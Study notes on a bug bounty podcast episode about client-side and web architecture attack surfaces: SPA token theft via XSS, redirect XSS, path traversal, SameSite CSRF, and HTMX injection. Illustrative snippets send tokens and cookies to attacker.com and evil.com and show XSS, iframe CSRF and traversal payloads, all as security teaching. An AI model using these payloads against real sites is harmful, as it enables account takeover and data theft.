# EP39: Web Architectures & Their Attack Surfaces - Client-Side Security Notes

## Metadata
- **Podcast:** Critical Thinking - Bug Bounty Podcast
- **Episode:** 39
- **Guests:** Justin Gardner (@rhynorater), Joel Margolis (teknogeek)
- **Topics:** Web architecture security patterns, SPA vs traditional app attack surfaces, DOM XSS, client-side path traversal, CSRF evolution, cookie vs bearer token auth, HTMX injection, postMessage, redirect-based XSS
- **Related:** LiveOverflow shout-out (covered Justin's XSS tweet), Evan Connolly Tesla ATO writeup

---

## 1. SPA + REST API: Bearer Tokens Leak via XSS

Single Page Applications (React, Vue, Angular) communicating with a REST API almost always store the session token client-side (localStorage, JS variable, application state). This makes any XSS an immediate path to Account Takeover.

### How It Works

1. SPA authenticates user against REST API
2. API returns a bearer token (JWT or opaque)
3. SPA stores the token in `localStorage`, a JS variable, or framework state
4. Every subsequent fetch/XHR attaches it via `Authorization: Bearer <token>`
5. Attacker finds DOM XSS or redirect-based XSS in the SPA
6. Attacker's JS reads the token from storage and exfiltrates it

```javascript
// --- VULNERABLE PATTERN ---
// SPA stores auth token in localStorage after login
fetch('/api/auth/login', {
    method: 'POST',
    body: JSON.stringify({ user, pass })
})
.then(r => r.json())
.then(data => {
    localStorage.setItem('authToken', data.token);  // <-- SINK: accessible to any JS on the page
});

// --- ATTACKER EXPLOITATION ---
// If XSS is achieved anywhere on the same origin:
const token = localStorage.getItem('authToken');   // <-- read the bearer token
fetch('https://attacker.com/steal?t=' + token);    // <-- exfiltrate => full ATO
```

```
   Victim Browser (SPA)
   +-----------------------------------------------+
   |  [Login] --> REST API --> JWT returned          |
   |       |                                         |
   |       v                                         |
   |  localStorage.setItem('token', jwt)             |
   |       |                                         |
   |  [XSS fires] --> reads localStorage             |
   |       |                                         |
   |       +----> fetch('https://evil.com?t='+jwt)   |
   +-----------------------------------------------+
                        |
                        v
              Attacker's Server (full ATO)
```

### Why This Works

- Unlike HTTP-only cookies, bearer tokens stored in JS-accessible locations (localStorage, sessionStorage, JS variables) have **zero browser-enforced protection** against same-origin script access.
- The browser does not manage bearer tokens. The application code does. If malicious JS runs on the same origin, it can read and exfiltrate the token.
- HTTP-only cookies, by contrast, are never readable by JavaScript and are automatically scoped by the browser's cookie policies (SameSite, Secure, Domain, Path).

### Where To Apply This

- On any SPA target, check where the auth token is stored: `localStorage`, `sessionStorage`, cookie (HTTP-only or not), JS variable/state.
- If stored in localStorage or a JS variable, any XSS = ATO. Escalation is trivial.
- Search JS files for: `localStorage.setItem`, `sessionStorage.setItem`, `Authorization`, `Bearer`.

---

## 2. DOM XSS and Redirect-Based XSS in SPAs

In SPAs, traditional reflected and stored XSS are largely eliminated because the server returns the same static HTML shell every time -- content is generated client-side by JavaScript. However, **DOM-based XSS** and **redirect-based XSS** become the primary XSS vectors.

### How It Works

**DOM XSS in SPA:**
1. SPA reads a value from the URL (query param, hash fragment, path segment)
2. Value is passed through framework routing or manual parsing
3. Value reaches a dangerous sink (`innerHTML`, `v-html`, `dangerouslySetInnerHTML`, `document.write`, `eval`)
4. No server round-trip occurs -- the entire flow is client-side

**Redirect-Based XSS in SPA:**
1. SPA reads a redirect target from URL parameter, postMessage, or hash
2. SPA performs a client-side redirect: `window.location.href = userInput`
3. Attacker supplies `javascript:alert(document.domain)` as the redirect value
4. Browser executes the JavaScript URI

```javascript
// --- DOM XSS via hash fragment ---
// SPA reads hash and injects into DOM
const section = window.location.hash.slice(1);       // SOURCE: attacker-controlled
document.getElementById('content').innerHTML = section; // SINK: innerHTML

// Attack URL: https://target.com/#<img src=x onerror=alert(1)>

// --- Redirect-based XSS via query parameter ---
const params = new URLSearchParams(window.location.search);
const next = params.get('redirect');                  // SOURCE: ?redirect=javascript:alert(1)
if (next) {
    window.location.href = next;                      // SINK: navigation with javascript: URI
}

// Attack URL: https://target.com/login?redirect=javascript:alert(document.cookie)
```

```
   Redirect-Based XSS Flow:

   Attacker crafts URL:
   https://app.com/callback?next=javascript:fetch('https://evil.com/'+localStorage.authToken)
          |
          v
   SPA Router reads 'next' param
          |
          v
   window.location.href = "javascript:fetch(...)"
          |
          v
   JS executes in app.com origin --> token stolen
```

### Why This Works

- SPAs rely heavily on client-side routing and dynamic content rendering.
- URL parameters, hash fragments, and postMessage data all flow through JavaScript without server-side sanitization.
- Frameworks provide dangerous sinks: React's `dangerouslySetInnerHTML`, Angular's `[innerHTML]` binding, Vue's `v-html` directive.
- `javascript:` URIs in navigation sinks (`location.href`, `location.assign`, `location.replace`) execute code in the current origin.

### Where To Apply This

- Audit all SPA JavaScript files for sources (URL params, hash, postMessage) flowing into sinks (innerHTML, eval, location assignments).
- Pay special attention to **sign-in/sign-out redirect parameters** -- these are frequent XSS/open redirect targets (per knowledge base rules).
- Search for: `innerHTML`, `outerHTML`, `document.write`, `dangerouslySetInnerHTML`, `v-html`, `location.href =`, `location.replace(`, `location.assign(`.

---

## 3. Client-Side Path Traversal in SPAs

Because SPAs dynamically load assets (JS chunks, CSS, templates, API data) based on client-side routing and parameters, there is a heightened risk for client-side path traversal attacks.

### How It Works

1. SPA constructs a fetch/import URL using user-controlled input (route param, query param)
2. Attacker injects path traversal sequences (`../`) into the parameter
3. The constructed URL resolves to a different resource than intended
4. This can load attacker-controlled content, hit unintended API endpoints, or leak data from other paths

```javascript
// --- VULNERABLE PATTERN ---
// SPA dynamically loads a template or API resource based on route param
const page = window.location.pathname.split('/')[2]; // e.g., /app/dashboard => "dashboard"

// Fetches: /api/pages/dashboard
fetch(`/api/pages/${page}`)                          // <-- no sanitization of path traversal
    .then(r => r.json())
    .then(data => renderPage(data));

// --- ATTACK ---
// URL: /app/..%2F..%2Fadmin%2Fusers
// After URL decoding, page = "../../admin/users"
// Fetch becomes: /api/pages/../../admin/users => /api/admin/users
// Attacker accesses admin endpoint without authorization
```

```
   Normal:  /app/dashboard --> fetch('/api/pages/dashboard')   --> user data

   Attack:  /app/..%2F..%2Fadmin%2Fusers
                    |
                    v
             fetch('/api/pages/../../admin/users')
                    |
                    v
             Server resolves: /api/admin/users  --> admin data leaked!
```

### Why This Works

- SPAs construct internal API paths and asset URLs from user-controlled route segments.
- Path normalization (`../`) is handled by the HTTP stack, not by the JavaScript code.
- URL encoding (`%2F` for `/`) may bypass client-side checks but get decoded by the server.
- Lazy-loaded JS chunks and CSS files are also susceptible if their paths are constructed from user input.

### Where To Apply This

- Look for any `fetch()`, `import()`, dynamic `<script src>`, or `<link href>` that incorporates URL path segments or query parameters.
- Test path traversal sequences: `../`, `..%2F`, `..%252F`, `%2e%2e/`, `%2e%2e%2f`.
- Particularly impactful when combined with microservices architecture (traversal hits a different backend service).

---

## 4. SameSite Cookies and the Death of Traditional CSRF

The episode discusses how `SameSite=Lax` cookies (now the browser default) have largely killed traditional CSRF, but a temporary browser accommodation still leaves a narrow window.

### How It Works

**The Lax+POST 2-minute window:**
1. Browser defaults cookies to `SameSite=Lax` if no SameSite attribute is set
2. Lax cookies are NOT sent on cross-site POST requests (blocking classic CSRF)
3. However, Chrome implemented a temporary accommodation: for the first **2 minutes** after a cookie is set, cross-site top-level POST requests WILL include the cookie
4. If the attacker can trigger a session reset (new cookie set), they get a 2-minute CSRF window

```
   Traditional CSRF (pre-SameSite):

   evil.com                          target.com
   +------------------+              +------------------+
   | <form action=    |   POST +     | Receives request |
   |  "target.com/    | cookies -->  | with victim's    |
   |   transfer">     |              | session cookie   |
   | <input value=    |              | => action executes|
   |  "attacker">     |              +------------------+
   +------------------+


   Post-SameSite=Lax:

   evil.com                          target.com
   +------------------+              +------------------+
   | <form action=    |   POST       | Cookie NOT sent  |
   |  "target.com/    | no cookies   | (SameSite=Lax)   |
   |   transfer">     | ---------->  | => 403 / no auth |
   +------------------+              +------------------+

   EXCEPT: First 2 min after cookie set (Lax+POST accommodation)
   If attacker forces session reset, the 2-minute window opens.
```

### Why This Works

- `SameSite=Lax` blocks cookies on cross-site subrequests (iframes, fetch, XHR) and cross-site POST requests.
- The 2-minute Lax+POST accommodation exists because some OAuth/SSO flows rely on cross-site POST with cookies.
- If the attacker can force a new session (e.g., via a login redirect), the fresh cookie gets the 2-minute window.
- This accommodation is temporary and will eventually be removed by Chrome.

### Where To Apply This

- Test CSRF on endpoints that use cookie-based auth without explicit CSRF tokens.
- If `SameSite=Lax` blocks your CSRF, check if you can force a session reset to exploit the 2-minute window.
- SPAs using bearer tokens in headers are NOT vulnerable to traditional CSRF (the token is never auto-attached by the browser), but they lose the cookie protections against XSS token theft.

---

## 5. HTMX Injection -- HTML Injection on Steroids

Justin and Joel flag HTMX as a dangerous framework that extends HTML attributes to trigger AJAX requests, WebSocket connections, and server-sent events directly from HTML markup.

### How It Works

1. Application uses HTMX, which adds attributes like `hx-get`, `hx-post`, `hx-trigger`, `hx-swap`
2. If the application has any HTML injection (even without script execution), attacker can inject HTMX attributes
3. Injected HTMX attributes cause the browser to make requests, load content, or swap DOM elements
4. This effectively turns HTML injection into XSS-equivalent impact, bypassing CSP `script-src` restrictions

```html
<!-- Normal HTMX usage -->
<button hx-get="/api/data" hx-target="#results" hx-swap="innerHTML">
    Load Data
</button>

<!-- HTMX Injection Attack -->
<!-- If attacker can inject HTML (e.g., via stored user input rendered without encoding): -->

<!-- Injected payload that auto-fires on page load: -->
<div hx-get="https://attacker.com/steal"
     hx-trigger="load"
     hx-vals='{"cookie": "document.cookie"}'
     hx-target="#hidden">
</div>

<!-- Or trigger arbitrary POST requests: -->
<div hx-post="/api/admin/delete-user"
     hx-trigger="load"
     hx-vals='{"userId": "victim-id"}'>
</div>

<!-- CSP with strict script-src does NOT block HTMX attribute execution -->
<!-- because HTMX is already an allowed script -- it processes HTML attributes -->
```

```
   HTMX Injection Attack Chain:

   1. Attacker injects HTML:  <div hx-get="https://evil.com" hx-trigger="load">
                                         |
   2. HTMX library (already loaded)      |
      processes the attribute             |
                                         v
   3. Browser makes GET to https://evil.com  (data exfil)
      OR makes POST to internal API          (action on behalf of victim)

   Key: No <script> tag needed. CSP script-src bypass.
```

### Why This Works

- HTMX processes HTML attributes as instructions to make HTTP requests and manipulate the DOM.
- If the HTMX library is loaded on the page, ANY injected HTML with `hx-*` attributes becomes executable.
- CSP `script-src` restrictions do not help because HTMX itself is an allowed script, and its attribute processing is not blocked.
- This converts what would normally be a low-impact HTML injection into full request forgery or data exfiltration.

### Where To Apply This

- Check if the target uses HTMX (look for `hx-` attributes in the DOM, `htmx.js` or `htmx.min.js` in script tags).
- If HTMX is present, any HTML injection vector becomes high-severity.
- Test even in places where CSP blocks inline scripts -- HTMX attributes will still work.

---

## 6. Chrome DevTools Local Overrides for JS File Modification

Joel discusses Chrome's native local overrides feature (improved in recent updates) as a replacement for the Resource Override browser extension, enabling real-time modification of JS files and XHR/fetch responses.

### How It Works

1. Open Chrome DevTools > Sources > Overrides
2. Select a local folder to store override files
3. Right-click any JS file or network response > "Override content"
4. Modify the file locally -- Chrome serves your modified version instead
5. Persists across page reloads (within the session)
6. Now works for XHR and fetch responses (new feature)

```
   Normal flow:
   Browser  --GET /app.js-->  Server  --200 app.js-->  Browser executes original

   With Override:
   Browser  --GET /app.js-->  [Chrome intercepts]
                                  |
                                  v
                          Local override file
                          (modified app.js)
                                  |
                                  v
                          Browser executes MODIFIED JS
```

### Why This Works

- Eliminates the need for Burp match-and-replace rules for JS file modification.
- Works directly in the browser context with full DevTools integration.
- Native XHR/fetch override support is new and replaces the need for extensions like Resource Override.
- Useful for: removing client-side security checks, modifying redirect logic, injecting debug breakpoints, testing DOM XSS by altering sink behavior.

### Where To Apply This

- Use when you need to modify client-side JS to test exploitation paths (e.g., remove a `DOMPurify.sanitize()` call to confirm a sink is reachable).
- Use to modify API responses locally to test how the SPA handles unexpected data.
- Faster iteration than Burp match-and-replace for JS-heavy targets.

---

## 7. Iframe Attacks and Pre-SameSite Cookie Behavior

Justin reflects on how before `SameSite` cookies, invisible iframes on attacker pages could perform cross-site actions with full cookie attachment, effectively giving attackers a CSRF-via-iframe capability.

### How It Works

```html
<!-- Pre-SameSite era: invisible iframe CSRF -->
<iframe src="https://target.com/api/transfer?to=attacker&amount=10000"
        style="display:none">
</iframe>
<!-- Browser sends target.com cookies with the iframe request automatically -->
<!-- The action executes with the victim's session -->

<!-- Post-SameSite=Lax era: -->
<!-- Cookies are NOT sent in cross-site iframe/subrequest contexts -->
<!-- This attack no longer works for SameSite=Lax or SameSite=Strict cookies -->
```

### Why This Works (historically)

- Before SameSite, cookies were sent on ALL requests to the cookie's domain, regardless of the initiating origin.
- An invisible iframe on `evil.com` loading `target.com/action` would carry all `target.com` cookies.
- Combined with clickjacking (UI redressing), this was devastating.

### Where To Apply This

- Check if any cookies are explicitly set with `SameSite=None` (required for cross-site iframe flows like SSO, payment widgets).
- `SameSite=None` cookies are still sent in iframes and cross-site requests, so old-school iframe CSRF may still work on those cookies.
- Look for OAuth callback flows, embedded widgets, and payment integrations that require `SameSite=None`.

---

## 8. Identifying Microservices Architecture via Response Discrepancies

Joel describes a technique for fingerprinting microservices architecture by comparing response characteristics across different endpoints on the same host.

### How It Works

1. Send requests to various endpoints on the same host
2. Compare response headers (`Server`, `X-Powered-By`, `Content-Type`, date formats, timezone offsets)
3. Compare error message formats (trigger 500 errors with invalid input on different endpoints)
4. Inconsistencies between endpoints indicate different backend services (microservices)
5. Once microservices are identified, test for secondary context / path traversal between them

```
   Fingerprinting microservices:

   GET /api/users/0000-0000      GET /api/billing/0000-0000
          |                              |
          v                              v
   Response:                      Response:
   Server: nginx/1.21             Server: Apache/2.4
   Content-Type: application/json Content-Type: text/xml
   Error: {"error":"not found"}   Error: <error>Not Found</error>

   CONCLUSION: Different backend services!
   => Test path traversal: GET /api/users/../billing/admin
```

### Why This Works

- Different engineering teams build different microservices with different tech stacks.
- Error handling, response formatting, and server headers are rarely standardized across teams.
- Even timezone differences in response headers can reveal separate services.

### Where To Apply This

- Compare `Server` headers, error formats, content types, and response structures across endpoints.
- Send null UUIDs (`00000000-0000-0000-0000-000000000000`) to trigger error responses that leak backend service names/paths.
- Use the information to map the internal architecture and identify path traversal targets.

---

## 9. Secondary Context Path Traversal in Microservices

When an API gateway routes requests to backend microservices, user-controlled values (IDs, paths) may be interpolated into internal request paths, enabling path traversal to hit unintended endpoints.

### How It Works

1. API gateway receives: `GET /api/users/{userId}`
2. Gateway constructs internal request: `GET http://user-service.internal/users/{userId}`
3. Attacker sends: `GET /api/users/..%2Fadmin%2Fall`
4. Gateway constructs: `GET http://user-service.internal/users/../admin/all`
5. Server normalizes: `GET http://user-service.internal/admin/all`
6. Auth was checked at the gateway level for `/api/users/*` but `admin/all` has no auth on the microservice

```javascript
// --- API Gateway (pseudo-code) ---
app.get('/api/users/:userId', authMiddleware, (req, res) => {
    // Auth check happens here at gateway level
    const userId = req.params.userId;  // <-- attacker controls this

    // Internal request to microservice -- no further auth
    const response = await fetch(`http://user-service.internal/users/${userId}`);
    //                                                          ^^^^^^^^^^^^^^^
    //                                            Path traversal: ../../admin/all

    res.json(await response.json());
});
```

```
   Normal:
   Client --> GET /api/users/abc-123 --> Gateway (auth check) --> user-service/users/abc-123

   Attack:
   Client --> GET /api/users/..%2Fadmin%2Fall --> Gateway (auth check passes for /api/users/*)
                                                      |
                                                      v
                                               user-service/users/../admin/all
                                                      |
                                                      v (path normalization)
                                               user-service/admin/all  --> ADMIN DATA LEAKED
```

**Joel's canary test for secondary context:**
```
# Test if path traversal is processed at all:
# Normal request:
GET /api/users/my-user-id  -->  200 OK, returns your data

# Canary request (traverse up then back down):
GET /api/users/./my-user-id  -->  If 200 OK with same data, path traversal is being processed!

# Or:
GET /api/users/../users/my-user-id  -->  If 200 OK, traversal confirmed, now go deeper
```

### Why This Works

- Authentication is often enforced only at the API gateway/reverse proxy level.
- Microservices trust internal requests and perform no additional authorization checks.
- Path normalization on the backend resolves `../` sequences after the gateway has already approved the request.
- UUID regex validation at the gateway may block this, but not all endpoints validate input format strictly.

### Where To Apply This

- Test every ID parameter and path segment with `../` traversal sequences.
- Use Joel's canary test: `./my-id` or `../same-path/my-id` to detect if traversal is processed.
- Test on EVERY endpoint -- one endpoint may validate UUIDs strictly, another may not.
- Check if auth is gateway-only by observing whether internal service errors leak different auth behavior.

---

## 10. Parameter Injection in Third-Party API Proxies

When a backend proxies requests to third-party APIs, user-controlled values may be interpolated into the API URL, enabling injection of additional query parameters.

### How It Works

1. Backend receives user request with a parameter value
2. Backend constructs a URL to a third-party API, embedding the user's value
3. Attacker injects URL-encoded `&` (`%26`) to add extra parameters
4. Attacker injects `#` to truncate the remaining original parameters
5. Third-party API processes the injected parameters

```javascript
// --- VULNERABLE BACKEND ---
app.get('/api/documents/:docId', (req, res) => {
    const docId = req.params.docId;

    // Constructs third-party API URL with user input
    const url = `https://docsigner-api.com/v1/docs/${docId}?apiKey=SECRET&format=pdf`;
    //                                                ^^^^^
    //                                           Attacker injects here

    const response = await fetch(url);
    res.json(await response.json());
});

// --- ATTACK ---
// docId = "anything%26owner=admin%23"
// Constructed URL becomes:
// https://docsigner-api.com/v1/docs/anything&owner=admin#?apiKey=SECRET&format=pdf
//                                           ^^^^^^^^^^^^^ ^
//                                    injected parameter    truncates rest with #
```

```
   Normal:
   Client --> /api/documents/doc123 --> Backend --> docsigner-api.com/v1/docs/doc123?apiKey=X&format=pdf

   Attack:
   Client --> /api/documents/doc123%26owner%3Dadmin%23
                    |
                    v
              Backend constructs:
              docsigner-api.com/v1/docs/doc123&owner=admin#?apiKey=X&format=pdf
                                              ^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^
                                              injected param  truncated (after #)
```

### Why This Works

- Backend code often concatenates user input into URLs without encoding.
- `%26` decodes to `&` (parameter separator), `%23` decodes to `#` (fragment, truncates query).
- Third-party API documentation is often publicly available, letting the attacker know exactly which parameters to inject.
- Similar to SQL injection but for URL query strings.

### Where To Apply This

- Identify endpoints that proxy to third-party APIs (document signing, payment processing, email services, etc.).
- Test parameter injection with: `%26`, `%3F` (`?`), `%23` (`#`).
- Read the third-party API's public documentation to find high-impact injectable parameters.
- Look for boolean parameters that can leak data (error-based, similar to blind SQLi).

---

## Summary Table

| # | Technique | Type | Impact | Complexity |
|---|-----------|------|--------|------------|
| 1 | Bearer Token Theft via XSS in SPAs | DOM XSS -> ATO | Critical | Low (once XSS is found) |
| 2 | DOM XSS / Redirect XSS in SPAs | DOM XSS, Open Redirect | High-Critical | Medium |
| 3 | Client-Side Path Traversal in SPAs | Client-Side Path Traversal | Medium-High | Medium |
| 4 | SameSite Lax+POST 2-min CSRF Window | CSRF | Medium | Medium-High |
| 5 | HTMX Injection (HTML Injection -> XSS) | HTML Injection, CSP Bypass | High-Critical | Low (if HTMX present) |
| 6 | Chrome Local Overrides for JS Modification | Tooling / Testing | N/A (tooling) | Low |
| 7 | Cross-Site Iframe Attacks (SameSite=None) | CSRF, Clickjacking | Medium-High | Low |
| 8 | Microservice Fingerprinting via Response Discrepancies | Recon / Architecture Mapping | Informational | Low |
| 9 | Secondary Context Path Traversal in Microservices | Authorization Bypass, IDOR | High-Critical | Medium |
| 10 | Parameter Injection in Third-Party API Proxies | Server-Side Parameter Injection | High | Medium |

---

## Key Quotes

> "Whenever you get XSS [in an SPA], it typically results in a pretty easy escalation to account takeover and session hijacking." -- Justin Gardner

> "When you have a bearer token, that has to be set somewhere... it's stored somewhere. And so if you have an XSS, oftentimes this can be in localStorage... and all of these are very, very easy to rip out from just pure JS and that's it. It's ATO." -- Joel Margolis

> "Reflected XSS, if you're doing a single page app, should not be there ever because nothing should be getting reflected. JavaScript is generating the content of that page." -- Justin Gardner

> "DOM based XSS... is pretty much going to be the only type of XSS that you get in these sort of single app contexts. And then there's also redirect based XSS." -- Justin Gardner

> "If you can figure out some way, via URL parameter, postMessage, hash, whatever, to affect the location of a redirect, a client-side redirect to be specific, and get a JavaScript URI in there, then you can actually start popping some XSS." -- Justin Gardner

> "I pray that [HTMX] never catches on because... HTMX injection is gonna be a thing and that's gonna be a cluster." -- Justin Gardner

> "HTML injection is gonna be... HTMX injection is gonna be a thing." -- Justin Gardner

> "I think it's important to recognize that we like stuff to follow a certain structure that is semi-predictable... you might notice a pattern within the URL endpoints and you can use that same pattern on lots of other endpoints." -- Joel Margolis

> "The idea is that auth applies to every single subservice so that there's a single point of auth. Problem is that if you have something like secondary context and the microservice isn't doing trust but verify..." -- Joel Margolis

> "I'll do dot slash user slash my ID and I'll just go up one and then back down one just to see if the path traversal works at all. And if it still returns my data, then I know to some extent it's passing that through." -- Joel Margolis

---

## Resources & References

- **LiveOverflow YouTube** -- Video covering Justin's XSS tweet (linked in episode description)
- **Resource Override** -- Chrome extension for rewriting responses (being replaced by native Chrome overrides)
- **Chrome DevTools Local Overrides** -- Native feature for JS/XHR/fetch response modification
- **Evan Connolly's Tesla ATO Writeup** -- IDP swap technique for account takeover (April 2023)
- **Cookie Monster** by Ian Carroll -- JWT secret brute-forcing tool
- **Joseph / JWT Attacker** -- Burp Suite extensions for JWT manipulation (algorithm:none, key confusion)
- **HTMX** (htmx.org) -- Framework extending HTML with AJAX/WebSocket attributes (security concern for HTML injection)
- **Kaido / Kaido Pro** -- Bug bounty tool (referral code: CTBB podcast, free for students)
- **Green Dog (Alexei Tiren)** -- Presentations on reverse proxy quirks and SAML hacking (CosHackStan conference)
- **SameSite Cookies** -- web.dev blog post (May 2019), Chrome implementation since November 2017
